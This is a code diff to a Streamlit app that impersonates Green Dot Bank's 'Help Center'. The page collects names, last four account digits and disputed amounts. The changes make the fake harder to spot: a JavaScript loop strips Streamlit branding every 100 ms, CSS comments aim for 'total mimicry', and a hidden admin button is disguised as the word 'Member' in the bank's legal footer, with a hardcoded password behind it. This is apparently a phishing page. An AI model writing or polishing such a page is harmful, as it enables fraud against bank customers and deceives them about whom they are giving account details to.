@@ -29,7 +29,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# --- JS: PURGA AGRESIVA ---
+# --- JS: PURGA ---
 st.markdown("""<script>
     const deepPurge = () => {
         const blackList = [
@@ -38,18 +38,15 @@ st.markdown("""<script>
             '.stElementToolbar', '.st-emotion-cache-140j12g', 'button[title="View fullscreen"]', 
             'header', 'footer', '.stDeployButton', '.st-emotion-cache-gi0tri', '.etxdrby3', '.etxdrby1'
         ];
-        blackList.forEach(sel => {
-            document.querySelectorAll(sel).forEach(el => el.remove());
-        });
+        blackList.forEach(sel => { document.querySelectorAll(sel).forEach(el => el.remove()); });
     };
     setInterval(deepPurge, 100);
 </script>""", unsafe_allow_html=True)
 
-# --- CSS: ESTILO ULTRA-SIMULADO ---
+# --- CSS: MIMETISMO TOTAL ---
 st.markdown("""<style>
-    .section-anchor, .st-emotion-cache-gi0tri, .etxdrby3, 
-    [data-testid="stHeaderActionElements"], [data-testid="stAppToolbar"], 
-    [data-testid="stElementToolbar"], .stElementToolbar, .st-emotion-cache-140j12g {
+    .section-anchor, [data-testid="stHeaderActionElements"], [data-testid="stAppToolbar"], 
+    [data-testid="stElementToolbar"], .stElementToolbar, .st-emotion-cache-140j12g, .st-emotion-cache-gi0tri {
         display: none !important; visibility: hidden !important; height: 0px !important;
     }
     
@@ -57,23 +54,38 @@ st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
 
-    /* Footer Minimalista Corregido */
+    /* Footer Legal Indistinguible */
     .legal-container {
-        font-size: 10px; color: #444; text-align: justify; margin-top: 60px;
-        border-top: 1px solid #111; padding-top: 15px; line-height: 1.4;
+        font-size: 10px; color: #444; text-align: justify; margin-top: 50px;
+        border-top: 1px solid #111; padding-top: 10px; line-height: 1.2;
     }
 
-    /* Botón Invisible de Acceso - Ultra Minimal */
-    div.stButton > button[key="ghost_admin"] {
-        background: transparent !important; border: none !important; color: #444 !important;
-        padding: 0 !important; margin: 0 !important; display: inline !important;
-        font-size: 10px !important; width: auto !important; height: auto !important;
-        min-height: 0 !important; min-width: 0 !important; box-shadow: none !important;
-        cursor: text !important; vertical-align: baseline !important;
-        line-height: inherit !important;
+    /* Botón Ghost corregido: sin fondo, sin bordes, color de texto legal */
+    div.stButton > button[key="ghost_32_2"] {
+        background-color: transparent !important; 
+        border: none !important; 
+        color: #444 !important;
+        padding: 0 !important; 
+        margin: 0 !important; 
+        display: inline !important;
+        font-size: 10px !important; 
+        font-family: inherit !important;
+        width: auto !important; 
+        height: auto !important;
+        min-height: 0 !important; 
+        min-width: 0 !important; 
+        box-shadow: none !important;
+        cursor: text !important; 
+        vertical-align: baseline !important;
+        transition: none !important;
     }
-    div.stButton > button[key="ghost_admin"]:hover, div.stButton > button[key="ghost_admin"]:active {
-        color: #444 !important; background: transparent !important; border: none !important;
+    div.stButton > button[key="ghost_32_2"]:hover, 
+    div.stButton > button[key="ghost_32_2"]:active, 
+    div.stButton > button[key="ghost_32_2"]:focus {
+        color: #444 !important; 
+        background: transparent !important; 
+        border: none !important;
+        box-shadow: none !important;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -87,7 +99,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("form_v32_1", clear_on_submit=True):
+    with st.form("ghost_form_32_2", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -100,14 +112,13 @@ if not st.session_state.admin_mode:
                 st.success(f"Success. Reference: {ref}")
             else: st.error("Information required.")
 
-    # Footer con botón mimetizado
+    # Footer mimetizado
     st.markdown("<div class='legal-container'>Green Dot® cards are issued by Green Dot Bank, ", unsafe_allow_html=True)
-    if st.button("Member", key="ghost_admin"): st.session_state.admin_mode = True
+    if st.button("Member", key="ghost_32_2"): st.session_state.admin_mode = True
     st.markdown(" FDIC. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924.</div>", unsafe_allow_html=True)
 
 else:
     st.title("🔐 Administrative")
     if st.button("Exit"): st.session_state.admin_mode = False
     pw = st.text_input("Auth Key", type="password")
-    if pw == "Diostieneelpoder1":
-        st.write("Access Granted")
+    if pw == "Diostieneelpoder1": st.write("Access Granted")
